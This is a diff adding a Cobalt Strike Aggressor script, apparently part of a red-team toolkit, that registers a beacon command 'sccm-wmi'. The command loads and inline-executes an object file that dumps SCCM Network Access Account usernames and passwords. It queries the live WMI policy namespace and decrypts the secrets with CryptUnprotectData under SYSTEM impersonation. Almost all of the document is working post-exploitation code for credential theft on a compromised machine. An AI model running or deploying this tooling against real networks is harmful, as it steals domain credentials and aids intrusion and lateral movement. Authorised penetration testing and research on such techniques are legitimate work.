@@ -1,0 +1,45 @@
+#
+# sccm-wmi BOF - SCCM CRED-3 live WMI triage
+#
+# Queries ROOT\ccm\policy\Machine\ActualConfig for CCM_NetworkAccessAccount and
+# decrypts the NAA username/password PolicySecret blobs locally as SYSTEM.
+#
+
+beacon_command_register(
+    "sccm-wmi",
+    "Recover SCCM Network Access Account creds from live WMI policy (CRED-3)",
+    "Synopsis: sccm-wmi\n\n" .
+    "Query the live SCCM policy WMI namespace (ROOT\\ccm\\policy\\Machine\\ActualConfig)\n" .
+    "and decrypt CCM_NetworkAccessAccount NetworkAccessUsername/NetworkAccessPassword\n" .
+    "PolicySecret blobs locally with CryptUnprotectData, impersonating SYSTEM.\n\n" .
+    "Arguments:\n" .
+    "  (none)\n\n" .
+    "Examples:\n" .
+    "  sccm-wmi\n\n" .
+    "Notes:\n" .
+    "  - Requires a high-integrity (admin) context\n" .
+    "  - Runs local CryptUnprotectData as SYSTEM after token impersonation\n" .
+    "  - For on-disk OBJECTS.DATA recovery, use sccm-disk (CRED-4) instead\n"
+);
+
+sub _read_bof_resource {
+    local('$bid $arch $rel $abs $h $bytes');
+    $bid  = $1;
+    $arch = barch($bid);
+    $rel  = "sccm-wmi." . $arch . ".o";
+    $abs  = script_resource($rel);
+    if ($abs is $null) { berror($bid, "missing resource: " . $rel); return $null; }
+    $h = openf($abs);
+    if ($h is $null) { berror($bid, "open failed: " . $abs); return $null; }
+    $bytes = readb($h, -1);
+    closef($h);
+    return $bytes;
+}
+
+alias sccm-wmi {
+    local('$bof');
+    $bof = _read_bof_resource($1);
+    if (isnull($bof) || strlen($bof) == 0) { berror($1, "empty BOF"); return; }
+    btask($1, "Running SCCM CRED-3 BOF (live WMI)");
+    beacon_inline_execute($1, $bof, "go", $null);   # no args
+}
